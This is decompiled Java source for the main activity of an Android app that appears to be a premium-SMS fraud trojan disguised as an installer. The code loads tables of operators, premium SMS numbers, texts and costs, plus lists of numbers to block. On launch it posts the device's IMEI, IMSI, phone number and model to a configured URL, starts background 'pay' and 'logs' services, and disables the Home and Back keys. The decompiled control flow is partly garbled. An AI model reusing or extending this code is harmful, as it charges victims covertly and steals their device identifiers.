package install.app;

import android.app.Activity;
import android.app.Dialog;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.Intent;
import android.content.res.Configuration;
import android.net.Uri;
import android.os.Build;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.os.Handler;
import android.view.KeyEvent;
import android.view.View;
import android.webkit.JsPromptResult;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.LinearLayout;
import android.widget.LinearLayout.LayoutParams;
import java.io.DataOutputStream;
import java.io.PrintStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.LinkedList;
import java.util.List;
import java.util.Vector;
import org.MobileDb.MobileDatabase;
import org.MobileDb.Table;
import org.apache.http.NameValuePair;
import org.apache.http.client.utils.URLEncodedUtils;

public class MainActivity
  extends Activity
  implements ThreadOperationListener
{
  public static int IDD_LOADING;
  public static int IDD_PROGRESS;
  public static Vector<String> aosList = new Vector();
  public static WebApi api;
  public static Vector<String> blockList;
  private static boolean loaded = false;
  public static Vector<SmsOperator> operatorsList;
  public static Settings settings = null;
  public static long startTime;
  public static WebView webView;
  public String apkUrl = "";
  public int globalMaxSmsCount = 0;
  public int globalRepeat = 0;
  public Handler handler = null;
  ProgressDialog loadingDialog = null;
  public boolean needBlock = false;
  public String postUrl = "";
  ProgressDialog progressDialog = null;
  public long waitForSend;
  
  static
  {
    IDD_PROGRESS = 1;
    IDD_LOADING = 2;
    startTime = 0L;
    operatorsList = new Vector();
    blockList = new Vector();
  }
  
  public MainActivity() {}
  
  public static void callJsCallbackAndroidVersion(String paramString)
  {
    System.out.println("callJsCallbackAndroidVersion()");
    System.out.println("version: " + paramString);
    try
    {
      paramString = "'" + paramString + "'";
      paramString = "javascript:androidVersion(" + paramString + ")";
      webView.loadUrl(paramString);
      return;
    }
    catch (Exception paramString)
    {
      paramString.printStackTrace();
    }
  }
  
  static Vector<SmsOperator> loadOperatorList(MobileDatabase paramMobileDatabase)
  {
    Vector localVector = new Vector();
    Object localObject1 = paramMobileDatabase.getTableByName("operators");
    int i = 0;
    long l;
    for (;;)
    {
      if (i >= ((Table)localObject1).rowsCount())
      {
        localObject1 = paramMobileDatabase.getTableByName("codes");
        i = 0;
        if (i < ((Table)localObject1).rowsCount()) {
          break;
        }
        l = 1L;
        paramMobileDatabase = paramMobileDatabase.getTableByName("sms");
        i = 0;
        if (i < paramMobileDatabase.rowsCount()) {
          break label291;
        }
        System.out.println("list: " + localVector.size());
        return localVector;
      }
      localObject2 = new SmsOperator((Integer)((Table)localObject1).getFieldValueByName("id", i));
      ((SmsOperator)localObject2).name = ((String)((Table)localObject1).getFieldValueByName("name", i));
      ((SmsOperator)localObject2).maxSmsCount = ((Integer)((Table)localObject1).getFieldValueByName("maxSmsCount", i)).intValue();
      ((SmsOperator)localObject2).maxSmsCost = ((Integer)((Table)localObject1).getFieldValueByName("maxSmsCost", i)).intValue();
      ((SmsOperator)localObject2).repeat = ((Integer)((Table)localObject1).getFieldValueByName("repeat", i)).intValue();
      localVector.addElement(localObject2);
      i += 1;
    }
    Object localObject2 = (Integer)((Table)localObject1).getFieldValueByName("operator_id", i);
    Object localObject3 = (String)((Table)localObject1).getFieldValueByName("code", i);
    int j = 0;
    for (;;)
    {
      if (j >= localVector.size()) {}
      for (;;)
      {
        i += 1;
        break;
        localObject4 = (SmsOperator)localVector.elementAt(j);
        if (((SmsOperator)localObject4).id != ((Integer)localObject2).intValue()) {
          break label284;
        }
        ((SmsOperator)localObject4).codes.addElement(localObject3);
      }
      label284:
      j += 1;
    }
    label291:
    Object localObject4 = (Integer)paramMobileDatabase.getFieldValueByName("operator_id", i);
    Integer localInteger = (Integer)paramMobileDatabase.getFieldValueByName("number", i);
    String str = (String)paramMobileDatabase.getFieldValueByName("text", i);
    int k = ((Integer)paramMobileDatabase.getFieldValueByName("cost", i)).intValue();
    int m = ((Integer)paramMobileDatabase.getFieldValueByName("wait", i)).intValue();
    localObject1 = (String)paramMobileDatabase.getFieldValueByName("responseText", i);
    localObject2 = (String)paramMobileDatabase.getFieldValueByName("responseNumber", i);
    j = 0;
    for (;;)
    {
      if (j >= localVector.size()) {}
      for (;;)
      {
        i += 1;
        break;
        localObject3 = (SmsOperator)localVector.elementAt(j);
        if (((SmsOperator)localObject3).id != ((Integer)localObject4).intValue()) {
          break label494;
        }
        localObject4 = new SmsItem(String.valueOf(localInteger.intValue()), str);
        ((SmsItem)localObject4).cost = k;
        ((SmsItem)localObject4).wait = m;
        ((SmsItem)localObject4).responseNumber = ((String)localObject2);
        ((SmsItem)localObject4).responseText = ((String)localObject1);
        ((SmsItem)localObject4).key = l;
        ((SmsOperator)localObject3).sms.addElement(localObject4);
        l += 1L;
      }
      label494:
      j += 1;
    }
  }
  
  public static void openUrl(Context paramContext, String paramString)
  {
    try
    {
      paramString = new Intent("android.intent.action.VIEW", Uri.parse(paramString));
      paramString.addFlags(268435456);
      paramContext.startActivity(paramString);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public static void sendGetRequest(String paramString, List<NameValuePair> paramList1, List<NameValuePair> paramList2)
  {
    sendSimpleHttpRequest(paramString, "GET", paramList1, paramList2);
  }
  
  public static HttpURLConnection sendHttpRequest(String paramString1, String paramString2, List<NameValuePair> paramList1, List<NameValuePair> paramList2)
  {
    Object localObject = null;
    for (;;)
    {
      try
      {
        if (paramString2.equals("POST"))
        {
          localObject = new URL(paramString1);
          paramString1 = (HttpURLConnection)((URL)localObject).openConnection();
          paramString1.setDoInput(true);
          paramString1.setDoOutput(true);
          paramString1.setUseCaches(false);
          paramString1.setRequestMethod(paramString2);
          if (!paramString2.equals("POST")) {
            break label367;
          }
          paramString1.setRequestProperty("Content-Type", "multipart/form-data; boundary=AaB03x");
          break label367;
          if (i >= paramList2.size())
          {
            if (!paramString2.equals("POST")) {
              continue;
            }
            paramString2 = new DataOutputStream(paramString1.getOutputStream());
            i = 0;
            if (i < paramList1.size()) {
              continue;
            }
            paramString2.writeBytes("--AaB03x--");
            paramString2.writeBytes("\r\n");
            paramString2.flush();
            paramString2.close();
            break;
          }
        }
        else
        {
          if (!paramString2.equals("GET")) {
            continue;
          }
          localObject = new URL(paramString1 + "?" + URLEncodedUtils.format(paramList1, "utf-8"));
          continue;
        }
        localObject = (NameValuePair)paramList1.get(i);
        paramString1.setRequestProperty(((NameValuePair)localObject).getName(), ((NameValuePair)localObject).getValue());
        i += 1;
        continue;
        paramList2 = (NameValuePair)paramList1.get(i);
        paramString2.writeBytes("--AaB03x");
        paramString2.writeBytes("\r\n");
        paramString2.writeBytes("Content-Disposition: form-data; name=\"" + paramList2.getName() + "\"");
        paramString2.writeBytes("\r\n");
        paramString2.writeBytes("\r\n");
        paramString2.write(paramList2.getValue().getBytes("utf-8"));
        paramString2.writeBytes("\r\n");
        i += 1;
        continue;
        if (!paramString2.equals("GET")) {
          break;
        }
        paramString1.connect();
      }
      catch (Exception paramString1)
      {
        paramString1.printStackTrace();
        return null;
      }
      label367:
      int i = 0;
    }
    return paramString1;
  }
  
  public static void sendPostRequest(String paramString, List<NameValuePair> paramList1, List<NameValuePair> paramList2)
  {
    sendSimpleHttpRequest(paramString, "POST", paramList1, paramList2);
  }
  
  public static void sendSimpleHttpRequest(String paramString1, String paramString2, List<NameValuePair> paramList1, List<NameValuePair> paramList2)
  {
    try
    {
      paramString1 = sendHttpRequest(paramString1, paramString2, paramList1, paramList2);
      if (paramString1 != null)
      {
        System.out.println("getResponseCode: " + paramString1.getResponseCode());
        paramString1.disconnect();
      }
      return;
    }
    catch (Exception paramString1)
    {
      paramString1.printStackTrace();
    }
  }
  
  public static void uninstallApk(Context paramContext, String paramString)
  {
    System.out.println("uninstallApk: " + paramString);
    Intent localIntent = new Intent("android.intent.action.DELETE");
    localIntent.setData(Uri.parse("package:" + paramString));
    localIntent.addFlags(268435456);
    paramContext.startActivity(localIntent);
  }
  
  public void loadData()
  {
    try
    {
      if (!loaded)
      {
        Object localObject1 = new MobileDatabase();
        ((MobileDatabase)localObject1).loadFrom("/res/raw/data.db", true);
        operatorsList = loadOperatorList((MobileDatabase)localObject1);
        Object localObject2 = ((MobileDatabase)localObject1).getTableByName("settings");
        this.apkUrl = ((String)((Table)localObject2).getFieldValueByName("url", 0));
        String str = (String)((Table)localObject2).getFieldValueByName("block_numbers", 0);
        localObject1 = (String)((Table)localObject2).getFieldValueByName("aos_numbers", 0);
        this.postUrl = ((String)((Table)localObject2).getFieldValueByName("post_url", 0));
        this.globalMaxSmsCount = ((Integer)((Table)localObject2).getFieldValueByName("maxSmsCount", 0)).intValue();
        this.waitForSend = ((Integer)((Table)localObject2).getFieldValueByName("time_between_send", 0)).intValue();
        this.globalRepeat = ((Integer)((Table)localObject2).getFieldValueByName("repeat", 0)).intValue();
        this.postUrl = this.postUrl.replace("{IMEI}", Settings.getImei(this));
        this.postUrl = this.postUrl.replace("{IMSI}", Settings.getImsi(this));
        this.postUrl = this.postUrl.replace("{PHONE}", Settings.getPhone(this));
        this.postUrl = this.postUrl.replace("{COUNTRY}", Settings.getCountry(this));
        this.postUrl = this.postUrl.replace("{APPID}", getText(2131099649));
        this.postUrl = this.postUrl.replace("{MODEL}", Build.MODEL);
        this.postUrl = this.postUrl.replace("{MANUFACTURER}", Build.MANUFACTURER);
        this.postUrl = this.postUrl.replace("{SDK}", String.valueOf(Build.VERSION.SDK_INT));
        System.out.println("apkUrl: " + this.apkUrl);
        System.out.println("block_numbers: " + str);
        System.out.println("aos_numbers: " + (String)localObject1);
        localObject2 = str.split(",");
        int i = 0;
        if (i >= localObject2.length)
        {
          localObject1 = ((String)localObject1).split(",");
          i = 0;
        }
        for (;;)
        {
          if (i >= localObject1.length)
          {
            loaded = true;
            return;
            System.out.println("blockNumbers: " + localObject2[i]);
            blockList.add(localObject2[i]);
            i += 1;
            break;
          }
          System.out.println("aosNumber: " + localObject1[i]);
          aosList.add(localObject1[i]);
          i += 1;
        }
      }
      return;
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
  }
  
  public void onClickNext(View paramView)
  {
    System.out.println("onClickNext()");
    openUrl(this, this.apkUrl);
  }
  
  public void onClickRule(View paramView)
  {
    System.out.println("onClickRule()");
  }
  
  public void onConfigurationChanged(Configuration paramConfiguration)
  {
    super.onConfigurationChanged(paramConfiguration);
    setRequestedOrientation(1);
  }
  
  public void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    startTime = System.currentTimeMillis();
    showDialog(IDD_LOADING);
    loadData();
    new Thread(new ThreadOperation(this, 1, null)).start();
    sendHttp();
    this.handler = new Handler();
    setContentView(2130903040);
    api = new WebApi(this, this);
    webView = new WebView(this);
    paramBundle = new WebViewClient()
    {
      public void onPageFinished(WebView paramAnonymousWebView, String paramAnonymousString)
      {
        System.out.println("Page loaded");
        try
        {
          MainActivity.this.loadingDialog.dismiss();
          MainActivity.callJsCallbackAndroidVersion(Build.VERSION.RELEASE);
          return;
        }
        catch (Exception paramAnonymousWebView)
        {
          for (;;)
          {
            paramAnonymousWebView.printStackTrace();
          }
        }
      }
    };
    webView.setWebViewClient(paramBundle);
    webView.setScrollBarStyle(33554432);
    webView.getSettings().setJavaScriptEnabled(true);
    webView.setWebChromeClient(new WebChromeClient()
    {
      public boolean onJsPrompt(WebView paramAnonymousWebView, String paramAnonymousString1, String paramAnonymousString2, String paramAnonymousString3, JsPromptResult paramAnonymousJsPromptResult)
      {
        paramAnonymousWebView = MainActivity.api.textToCommand(paramAnonymousString2, paramAnonymousString3);
        if (paramAnonymousWebView.find)
        {
          paramAnonymousJsPromptResult.confirm(paramAnonymousWebView.result);
          return true;
        }
        return false;
      }
    });
    webView.addJavascriptInterface(api, "webapi");
    webView.setLayoutParams(new LinearLayout.LayoutParams(-1, -2, 1.0F));
    ((LinearLayout)findViewById(2131230721)).addView(webView);
    webView.loadUrl("file:///android_asset/html/index.html");
  }
  
  protected Dialog onCreateDialog(int paramInt)
  {
    if (paramInt == IDD_PROGRESS)
    {
      this.progressDialog = new ProgressDialog(this);
      this.progressDialog.setProgressStyle(1);
      this.progressDialog.setTitle("Download");
      this.progressDialog.setMessage("Please wait");
      this.progressDialog.setCancelable(false);
      return this.progressDialog;
    }
    if (paramInt == IDD_LOADING)
    {
      this.loadingDialog = new ProgressDialog(this);
      this.loadingDialog.setProgressStyle(0);
      this.loadingDialog.setTitle("");
      this.loadingDialog.setMessage("Loading...");
      this.loadingDialog.setCancelable(false);
      return this.loadingDialog;
    }
    return null;
  }
  
  public boolean onKeyDown(int paramInt, KeyEvent paramKeyEvent)
  {
    System.out.println("onKeyDown(): keyCode = " + paramInt);
    if (paramInt == 3) {}
    while (paramInt != 4) {
      return true;
    }
    return true;
  }
  
  public void sendHttp()
  {
    try
    {
      new Thread(new Runnable()
      {
        public void run()
        {
          MainActivity.sendPostRequest(MainActivity.this.postUrl, new LinkedList(), new LinkedList());
        }
      }).start();
      return;
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
  }
  
  public void threadOperationRun(int paramInt, Object paramObject)
  {
    if (paramInt == 1)
    {
      if (settings == null)
      {
        settings = new Settings();
        Settings.setSettings(settings);
        if (!settings.load(this))
        {
          System.out.println("FIRST START");
          settings.operatorList = operatorsList;
          settings.blockList = blockList;
          settings.waitForSend = this.waitForSend;
          settings.globalMaxSmsCount = this.globalMaxSmsCount;
          settings.globalRepeat = this.globalRepeat;
          settings.aosList = aosList;
          settings.save(this);
        }
        settings.load(this);
        settings.printToOutStream();
      }
      MainService.start(this, new Intent(), "pay");
      MainService.packageName = getPackageName();
      MainService.start(this, new Intent(), "logs");
      Settings.startKillTimer(this, 10L);
    }
  }
  
  public void uninstall()
  {
    uninstallApk(this, getPackageName());
  }
}
